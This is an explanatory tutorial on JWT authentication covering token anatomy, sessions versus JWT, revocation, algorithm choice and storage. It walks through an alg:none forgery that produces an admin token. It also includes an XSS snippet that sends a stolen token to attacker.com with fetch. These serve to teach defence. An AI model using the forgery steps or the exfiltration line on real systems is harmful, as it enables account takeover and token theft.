01

Why JWT exists

Before JWT, authentication meant server-side sessions. You logged in, the server wrote a record to a database or in-memory store, and you got back a cookie with a session ID. Simple — but it doesn't scale.

The old problem

Sessions live on the server. Add more servers to handle traffic and they all need to share one session store — usually Redis or a DB. Every request triggers a DB lookup just to answer "who is this person?"

What JWT solves

The token carries all identity information inside itself. Any server can verify it with just a key — no shared session store, no DB lookup per request. Servers become truly stateless.

JWT was introduced mainly for stateless REST APIs, microservices, and single sign-on (SSO) — situations where multiple independent services need to trust the same identity without calling each other or a shared database.

Mental model

A JWT is like a signed ID card. Anyone can read what's on it, but they can't forge it because the stamp (signature) requires the issuer's secret seal. Unlike a session ID cookie, the card itself proves who you are.

02

Anatomy of a JWT

A JWT is three base64url-encoded chunks joined by dots. Each part has a specific role.

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo0MiwiZW1haWwiOiJhbmFAZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MTQwMDM2MDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Header
Algorithm info

Declares token type and signing algorithm. Decoded:

{
  "alg": "HS256",
  "typ": "JWT"
}
Payload
The claims

User data, roles, expiry. Not encrypted — just encoded. Anyone can read it.

{
  "user_id": 42,
  "role": "admin",
  "exp": 1714003600
}
Signature
Tamper proof seal

HMAC of header + payload using the secret key. If any byte changes, the signature becomes invalid.

HMAC-SHA256(
  base64(header) +
  "." +
  base64(payload),
  SECRET_KEY
)
⚠️
The payload is only base64 encoded, not encrypted. Anyone who intercepts a JWT can decode and read everything in it. Never store passwords, credit card numbers, or secrets in the payload.

Standard payload fields (registered claims)

Field Name What it means
issIssuerWho created the token (e.g. "auth.myapp.com")
subSubjectWho the token is about — usually the user ID
expExpirationUnix timestamp when the token becomes invalid
iatIssued AtUnix timestamp when the token was created
nbfNot BeforeToken is invalid before this time
jtiJWT IDUnique ID for this token — used to prevent replay attacks
03

How it works

The full JWT authentication cycle — from login to every subsequent request.

1
User submits credentials

Browser or mobile app sends email + password to the auth endpoint.

HTTP
POST /login
Content-Type: application/json

{ "email": "ana@example.com", "password": "hunter2" }
2
Server validates & signs a token no DB write

Credentials check out. Server builds the payload and signs it. Nothing is stored anywhere — this is the core difference from sessions.

Node.js
const payload = {
  user_id: 42,
  email: "ana@example.com",
  role: "admin",
  exp: Math.floor(Date.now() / 1000) + (60 * 60)  // 1 hour
};

const token = jwt.sign(payload, process.env.SECRET_KEY);
3
Server returns the token

Client receives the token in the response body and stores it.

HTTP Response
HTTP/1.1 200 OK
Content-Type: application/json

{
  "token": "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0Mn0.SflKx...",
  "expires_in": 3600
}
4
Client sends JWT with every request no DB read

Token goes in the Authorization header. Server verifies locally — recomputes the signature and checks it matches. Zero database calls.

HTTP
GET /api/dashboard
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0Mn0...

// Server does this — no DB involved:
1. Decode header + payload
2. Re-sign with SECRET_KEY
3. Signatures match? ✓ → user_id = 42, role = "admin"
5
Logout — client discards token token lingers

The server never stored anything, so there's nothing to delete. The client removes the token from storage. But the token itself remains cryptographically valid until it expires — this is the revocation trade-off covered later.

Session vs JWT — the real comparison

Both approaches work. The right choice depends on your architecture.

Session-based flow

1
Login → server writes to DB DB write
SQL
-- Server creates a session row:
INSERT INTO sessions (id, user_id, expires_at)
VALUES ('s_xK9mP2', 42, NOW() + INTERVAL 1 DAY)
2
Every request → DB lookup DB read
SQL
SELECT user_id FROM sessions
WHERE id = 's_xK9mP2' AND expires_at > NOW()
3
Logout → instant kill clean
SQL
DELETE FROM sessions WHERE id = 's_xK9mP2'
-- Token is immediately dead. No grace period.

Server storageStores every active sessionStores nothing
DB per requestOne lookup every timeZero — local verify only
ScalingAll servers share one session storeAny server verifies independently
RevocationInstant — delete the rowHard — token lives until expiry
Cookies vs headersCookies (auto-sent by browser)Authorization header (manual)
Mobile/SPA friendlyNeeds extra CORS setupWorks naturally
Best forMonoliths, banking, admin toolsAPIs, microservices, SPAs
05

Benefits

Stateless

Servers hold no session data. Spin up 10 API servers — they all verify tokens the same way with just the secret key. No shared infrastructure needed.

Microservice friendly

Service A issues the token. Services B, C, D verify it independently. No central session store. No inter-service auth calls.

Cross-domain / CORS

Tokens travel in HTTP headers, not cookies. React app on one domain, API on another — no CORS cookie configuration headaches.

Self-contained

Roles, permissions, and user info can live in the token. Receiving services don't need to query a DB to know who the user is or what they can do.

Issues & gotchas

The things that trip teams up in production.

06

Size overhead

A minimal JWT — just user ID and expiry — is around 150–200 bytes. Real-world tokens grow fast when teams embed convenience data.

Lean token (~180 bytes)
Payload
{
  "sub": "42",
  "exp": 1714003600
}
Bloated token (~900 bytes)
Payload
{
  "user_id": 42,
  "email": "ana@example.com",
  "full_name": "Ana Silva",
  "roles": ["admin", "editor"],
  "permissions": ["read:users",
    "write:users", "delete:posts"],
  "org_id": "org_xK9mP2",
  "plan": "enterprise",
  "feature_flags": ["beta_ui", ...]
}

A page load that triggers 20–30 API calls carries that full token in every single request header. On HTTP/1.1 (no header compression) that's 10–20 KB of pure auth overhead per page load.

When does it actually matter?

ScenarioImpact
HTTP/2 with HPACK compressionHeaders compressed — much less of an issue
HTTP/1.1 (older infra)Full byte cost on every request
High-frequency polling (every 1–2s)Adds up quickly at scale
IoT / embedded devicesReal bandwidth constraint
Mobile on 3G/4GNoticeable latency

The fix — keep tokens lean

Only put identity in the token, not profile data or permission lists. Look up permissions from the DB only on routes that need them.

Node.jsrecommended pattern
// Token carries minimum:
const token = jwt.sign(
  { sub: user.id, exp: Math.floor(Date.now() / 1000) + 3600 },
  SECRET_KEY
);

// On protected routes, load permissions fresh:
const permissions = await db.query(
  'SELECT permissions FROM users WHERE id = $1', [req.user.sub]
);
// One DB call only where needed — not on every request
07

The alg:none attack

One of the most elegant exploits in web security — no brute force, no key cracking, just editing a base64 string.

💀
Root cause: Early JWT libraries trusted the token's own alg header to decide how to verify it. The attacker controls the token — so the attacker controls the answer.

The attack step by step

You're a logged-in user with a normal token:

Your legitimate token
Header:  { "alg": "HS256", "typ": "JWT" }
Payload: { "user_id": 42, "role": "user" }
Sig:     SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

You can't forge the signature without the secret key. But with a vulnerable library, you don't need to:

1
Decode the payload (no key needed)
bash
echo "eyJ1c2VyX2lkIjo0Miwicm9sZSI6InVzZXIifQ==" | base64 -d
# → { "user_id": 42, "role": "user" }
2
Edit the payload
JSON
// Changed user_id to 1 (the super admin) and role to admin
{ "user_id": 1, "role": "admin" }
3
Re-encode with alg:none and empty signature
Forged token
Header:  { "alg": "none", "typ": "JWT" }
Payload: { "user_id": 1, "role": "admin" }
Sig:     (empty — just a trailing dot)

eyJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.
4
Vulnerable server grants admin access

The library reads alg: none, skips verification, and happily trusts the payload. You're now admin.

The vulnerable code that made this possible

JavaScript❌ vulnerable pattern
function verify(token) {
  const { alg } = decodeHeader(token)  // trusting attacker-controlled data

  if (alg === 'none') {
    return decodePayload(token)       // no verification at all!
  }
  return verifyWithKey(token, alg, SECRET_KEY)
}
JavaScript✅ safe pattern
// Server NEVER asks the token what algorithm to use.
// It already knows — and enforces it.

jwt.verify(token, SECRET_KEY, { algorithms: ['HS256'] })
// alg:none → rejected before touching the payload
// alg:RS256 → rejected (not in allowlist)
// alg:HS256 → proceeds normally
📌
PyJWT v2+ requires the algorithms= parameter — it throws an error if you omit it. This was a deliberate design response to this exact attack. Treat it as a reminder, not an annoyance.

The RS256 cousin attack

Same root cause, different flavour. If your server supports both HS256 and RS256:

  1. Server signs with RS256 — public key is openly available
  2. Attacker changes header to alg: HS256
  3. Attacker signs the forged token with the public key
  4. Vulnerable server verifies HS256 using its stored "key" — which is the public key
  5. Signature matches. Admin access granted.

Fix: same as before — hardcode the allowed algorithm, never read it from the token.

08

Storage risks

Where you store the JWT determines which attacks you're vulnerable to. There's no perfect answer — it's a trade-off.

Critical
localStorage → vulnerable to XSS

Any JavaScript on your page can read localStorage. A successful XSS injection — even from a third-party script like an analytics widget — can steal the token and exfiltrate it silently.

Attack
// Any injected script can do this:
const token = localStorage.getItem('jwt');
fetch('https://attacker.com/steal?t=' + token);
Medium
Cookie storage → vulnerable to CSRF

Cookies are automatically sent with every browser request, including cross-site requests. An attacker's page can trigger requests to your API using the victim's cookie without ever reading it.

💡
Mitigate with SameSite=Strict or SameSite=Lax + CSRF tokens on state-changing requests.

The recommended pattern

Access token — in memory

Short-lived (15 min). Stored in a JS variable — not localStorage, not a cookie. Gone on page refresh. Hard to steal remotely.

Refresh token — httpOnly cookie

Long-lived (7–30 days). Stored in an httpOnly, Secure, SameSite=Strict cookie. JavaScript can't read it. Used only to get a new access token.

Node.jssetting the refresh token cookie
res.cookie('refresh_token', refreshToken, {
  httpOnly: true,    // JS cannot read this
  secure: true,      // HTTPS only
  sameSite: 'strict', // blocks cross-site requests
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
});
09

The revocation problem

This is JWT's biggest practical limitation. Once a token is issued, you cannot cancel it before it expires — there's no server-side record to delete.

🔥
Real scenarios where this hurts: User changes password (old tokens still work). Account banned for abuse (tokens still work). Employee terminated (tokens still work). Credentials stolen (attacker's copy still works).

The two real solutions

Option A
Short expiry + refresh tokens

Keep access tokens short-lived (5–15 minutes). They expire quickly so the damage window of a stolen token is small. Refresh tokens (stored in httpOnly cookies) silently issue new access tokens — users stay logged in without noticing.

Flow
Access token expires  → client uses refresh token
Refresh token valid   → server issues new access token (15 min)
Refresh token expired → user must re-login

// To "revoke" on password change:
// Invalidate the refresh token in DB → user gets logged out
// within 15 minutes (next access token expiry)
Option B
Token blocklist (denylist)

On logout or revocation, store the token's jti (JWT ID) in Redis with TTL matching the token expiry. Check every incoming token against this list.

Node.js + Redis
// On logout:
await redis.setex(`blocklist:${token.jti}`, token.exp - Date.now() / 1000, '1');

// On each request:
const blocked = await redis.get(`blocklist:${decoded.jti}`);
if (blocked) throw new Error('Token revoked');
⚠️
This reintroduces server-side state — you're partially back to the session model. Use only when instant revocation is required.
10

HS256 vs RS256

The algorithm choice determines who can verify (and potentially forge) your tokens.

HS256 — Symmetric
Auth server
→ signs with →
SECRET_KEY
→ verifies with →
same SECRET_KEY

Every service that verifies must hold the secret. Every service that holds the secret can also forge tokens.

RS256 — Asymmetric
Auth server only
→ signs with →
Private key (secret)
Any service
→ verifies with →
Public key (shareable)
→
can verify, cannot forge ✓
Use HS256 when
  • Single backend or services you fully own
  • All verifying servers are under your control
  • Simplicity and performance matter
  • Standard web app or internal API
Use RS256 when
  • Third parties need to verify your tokens
  • Building an identity provider or SSO
  • Different teams own different services
  • Public API with external consumers

If you use HS256 — secret key strength is everything

A weak secret is brute-forceable offline. An attacker who intercepts a token can test millions of keys without touching your server.

bash
# Generate a strong secret (256 bits = 32 bytes):
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
# → f7a2c9e1b84d3f6a0e5c2b9d7f4a1e8c3b6d9f2a5c8e1b4d7...

# ❌ Weak — brute-forceable in seconds
SECRET = "mysecret"
SECRET = "jwt-secret-key"
SECRET = "password"

# ✅ Strong — 64 random bytes, hex encoded
SECRET = "f7a2c9e1b84d3f6a0e5c2b9d7f4a1e8c..."
🔑
Treat your JWT secret like a database password: store it in environment variables, never commit it to code, rotate it if it leaks, use a minimum of 256 bits of entropy.
✓

TL;DR

In one sentence

A JWT is a signed, self-contained token that lets servers verify who you are without storing any session data — but it trades instant revocation for statelessness.

Do
  • ✓  Keep tokens lean — identity only
  • ✓  Short expiry (15 min for access tokens)
  • ✓  Hardcode the algorithm server-side
  • ✓  Use httpOnly cookies for refresh tokens
  • ✓  Use a 256-bit random secret for HS256
  • ✓  Use RS256 if third parties verify tokens
Don't
  • ✗  Store sensitive data in the payload
  • ✗  Trust the token's own alg header
  • ✗  Store access tokens in localStorage
  • ✗  Use long expiry without refresh tokens
  • ✗  Share the HS256 secret with outside services
  • ✗  Embed permissions lists in the token
QuestionAnswer
Can anyone read the payload?Yes — it's base64 encoded, not encrypted
Can anyone forge a token?No — not without the secret/private key
Can I revoke a token before it expires?Only with a blocklist (adds state back)
Is HS256 secure?Yes — if your secret is strong and private
Should I use sessions instead?Depends — sessions for monoliths/banking, JWT for APIs/microservices
